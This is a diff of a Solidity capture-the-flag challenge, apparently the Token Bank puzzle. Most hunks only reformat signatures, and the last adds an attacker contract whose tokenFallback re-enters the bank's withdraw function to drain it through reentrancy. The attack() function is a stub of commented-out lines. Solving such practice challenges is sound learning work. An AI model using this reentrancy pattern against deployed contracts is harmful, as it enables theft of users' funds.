@@ -2,11 +2,7 @@
 pragma solidity ^0.8.13;
 
 interface ITokenReceiver {
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes memory data
-    ) external;
+    function tokenFallback(address from, uint256 value, bytes memory data) external;
 }
 
 contract SimpleERC223Token {
@@ -40,11 +36,7 @@ contract SimpleERC223Token {
         return transfer(to, value, empty);
     }
 
-    function transfer(
-        address to,
-        uint256 value,
-        bytes memory data
-    ) public returns (bool) {
+    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
         require(balanceOf[msg.sender] >= value);
 
         balanceOf[msg.sender] -= value;
@@ -57,28 +49,17 @@ contract SimpleERC223Token {
         return true;
     }
 
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
+    event Approval(address indexed owner, address indexed spender, uint256 value);
 
     mapping(address => mapping(address => uint256)) public allowance;
 
-    function approve(
-        address spender,
-        uint256 value
-    ) public returns (bool success) {
+    function approve(address spender, uint256 value) public returns (bool success) {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
         return true;
     }
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 value
-    ) public returns (bool success) {
+    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
         require(value <= balanceOf[from]);
         require(value <= allowance[from][msg.sender]);
 
@@ -108,11 +89,7 @@ contract TokenBankChallenge {
         return token.balanceOf(address(this)) == 0;
     }
 
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes memory data
-    ) public {
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
 
@@ -132,9 +109,36 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
     // Write your exploit functions here
+
+    function attack() public {
+        // victimContract.mint(0, "");
+        // victimContract.safeTransferFrom(address(this), owner, 0, 5, "");
+
+        //deposit in order to update contract's balance in bank
+        // _token.transfer(address(challenge), _token.balanceOf(address(this))); //, abi.encode("deposit"));
+    }
+
+    function tokenFallback(address from, uint256 value, bytes memory data) public {
+        token = challenge.token();
+        SimpleERC223Token _token = token;
+        if (data.length > 0) {
+            if (keccak256(data) == keccak256(abi.encode("deposit"))) {
+                //deposit,
+                _token.transfer(address(challenge), _token.balanceOf(address(this)));
+            } else {
+                //unrecognized data
+                revert("unrecognized data");
+            }
+        }
+        //conduct attack, received token from withdraw
+        if (_token.balanceOf(address(challenge)) > 0) {
+            challenge.withdraw(challenge.balanceOf(address(this)));
+        }
+    }
 }
